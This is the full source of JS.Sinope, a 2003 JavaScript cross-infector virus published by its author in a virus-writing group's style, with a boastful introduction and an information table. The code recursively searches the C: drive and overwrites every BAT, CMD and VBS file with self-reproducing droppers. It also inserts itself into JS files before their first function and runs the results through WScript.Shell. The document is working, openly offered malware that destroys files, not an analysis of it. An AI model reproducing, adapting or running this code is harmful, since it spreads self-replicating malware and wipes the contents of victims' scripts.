  JS.Sinope
  by Second Part To Hell[rRlf]
  www.spth.de.vu
  spth@aonmail.at
  written from may 2003 to 23 june 2003
  Austria

  This is a JavaScript cross infector. It infects JS files anywhere in the middle
  of the code and it overwrites BAT and VBS files with a file, which contains the
  javascript code of the virus and which makes a new files and run it. It was hell
  to write, because I must not use any special sign for JavaScript or Visual Basic
  Script (chr(34)<--["]) or Batch (chr(37)<--[%], chr(60)<--[<], chr(62)<--[>])
  because the program will stop without doing anything but showing an error message.
  Because of that I had to define them at the start or the code. To infect JS files
  it searches for the sting 'function' in the victim code, and include itself before
  that code. And at the begin of the code it calls the virus-function. To infect BAT
  and VBS files it just overwrite there victims. All in all, I'm very proud that I'm
  the author of this virus. :)

  General Virus Information:
  VirusName.................... JS.Sinope
  VirusAuthor.................. Second Part To Hell[rRlf]
  Infection Way................ Infect the JS files anywhere in the
				middle of the code, and overwrites
				the VBS and BAT files with the new generated
				file, which makes a new file with the orginal
				viruscode and run it.
  Payload...................... No
  EPO.......................... Yes
  Cross Infector............... Yes
    VBS files.................. Yes
    BAT files.................. Yes
    CMD files.................. Yes

  At the end of my introduction I hopw that you like my virus, any you will learn
  something from it. Yes, there are things to learn from ;). I'm sure, that there
  is no other .VBS / .JS (EPO) / .BAT / .CMD infector with just 40 lines out there.
  OK, now look at the code and become crazy. (Like I!!!) :D

  Final Note: There are 2 empty lines in the end of the virus. That's important,
  otherwise it would not work!!!

-------------------------------------[JS.Sinope]-------------------------------------
Sinope()
function Sinope() {
var fso=WScript.CreateObject('Scripting.FileSystemObject')
var shell=WScript.CreateObject('WScript.Shell')
big=String.fromCharCode(62);
small=String.fromCharCode(60);
comma=String.fromCharCode(34);
percent=String.fromCharCode(37);
nl=String.fromCharCode(13)+String.fromCharCode(10);
myfile=fso.OpenTextFile(WScript.ScriptFullName); mycode='';
eval('for (i=0; i'+small+'500; i++) { code=myfile.ReadLine(); if (code=='+comma+'function Sinope() {'+comma+') { for (j=1; j'+small+'40; j++) { mycode+=code+nl; code=myfile.ReadLine(); i=666; } } }')
sino=fso.CreateTextFile('sinope.tmp').Write(mycode)
bat=fso.CreateTextFile('sinope.bat')
bat.WriteLine('cls'+nl+'@echo off'+nl+'echo Sinope()'+big+'javascript.js')
my=fso.OpenTextFile('sinope.tmp')
eval('for (i=0; i'+small+'1; i++) { mlc=my.ReadLine(); if (mlc!='+comma+'// End'+comma+') { i--; bat.WriteLine('+comma+'echo '+comma+'+mlc+big+big+'+comma+' javascript.js'+comma+'); } }')
bat.WriteLine('echo // End'+big+big+'javascript.js'+nl+'echo.'+big+big+'javascript.js'+nl+'echo.'+big+big+'javascript.js'+nl+'cscript javascript.js')
bat.Close(); my.Close();
vbsfile=fso.CreateTextFile('sinope.vbs')
vbsfile.WriteLine('set fso=WScript.CreateObject('+comma+'Scripting.FileSystemObject'+comma+')'+nl+'set shell=WScript.CreateObject('+comma+'WScript.Shell'+comma+')'+nl+'set a=fso.CreateTextFile('+comma+'javas.js'+comma+')'+nl+'a.WriteLine'+comma+'Sinope()'+comma)
my=fso.OpenTextFile('sinope.tmp')
eval('for (i=0; i'+small+'1; i++) { mlc=my.ReadLine(); if (mlc!='+comma+'// End'+comma+') { i--; vbsinclude(mlc) } }')
vbsfile.WriteLine('a.WriteLine '+comma+'// End'+comma+'+chr(13)+chr(10)+chr(13)+chr(10)+chr(13)+chr(10)'+nl+'a.Close'+nl+'shell.Run'+comma+'javas.js'+comma)
infsearch=fso.CreateTextFile('search.bat')
infsearch.WriteLine('cls'+nl+'@echo off'+nl+'assoc .cmd'+nl+'if errorlevel 1 goto bat'+nl+'for /r C:\ '+percent+percent+'a in (*.bat) do copy sinope.bat '+percent+percent+'a'+nl+'for /r C:\ '+percent+percent+'b in (*.cmd) do copy sinope.bat '+percent+percent+'b'+nl+'for /r C:\ '+percent+percent+'c in (*.vbs) do copy sinope.vbs '+percent+percent+'c'+nl+'echo.'+big+'js.lst'+nl+'for /r C:\ '+percent+percent+'d in (*.js) do echo '+percent+percent+'d '+big+big+'js.lst'+nl+'echo end'+big+big+'js.lst'+nl+'goto :EOF'+nl+':bat')
infsearch.Close(); my.Close();
shell.Run('search.bat')
eval('for (i=0; i'+small+'3000000; i++) { i--; i++; }') 
javf=fso.OpenTextFile('js.lst')
eval('for (i=0; i'+small+'1; i++) { javline=javf.ReadLine(); if (javline!='+comma+'end'+comma+') { i--; if (fso.FileExists(javline)) { infjs(javline) } } }') }
function vbsinclude(mlc) {
vbsfile.WriteLine('a.WriteLine'+comma+mlc+comma) }
function infjs(victimname) { 
var fso=WScript.CreateObject('Scripting.FileSystemObject'); var vicall=fso.OpenTextFile(victimname).ReadAll()
var victim=fso.OpenTextFile(victimname)
var vcode=''; var viccodes=''; vsearch='FUNCTION';
eval('for (i=0; i'+small+'vicall.length; i++) { vcode=victim.Read(1);'+nl+'if (vcode.toUpperCase()=='+comma+'F'+comma+') { for (j=1; j'+small+'8; j++) { vcode+=victim.Read(1); if (vcode.toUpperCase() !=vsearch.substring(0,j+1)) { j=666 }; i++; } }'+nl+'if (vcode.toUpperCase()==vsearch) { i=vicall.lenght+666 }'+nl+'if (vcode.toUpperCase()!=vsearch) { viccodes+=vcode } }')
virinc=fso.OpenTextFile(victimname, 2).Write('Sinope()'+nl+viccodes+nl+mycode+nl+'function'+victim.ReadAll()); victim.Close();
}
// End



-------------------------------------[End of JS.Sinope]-------------------------------------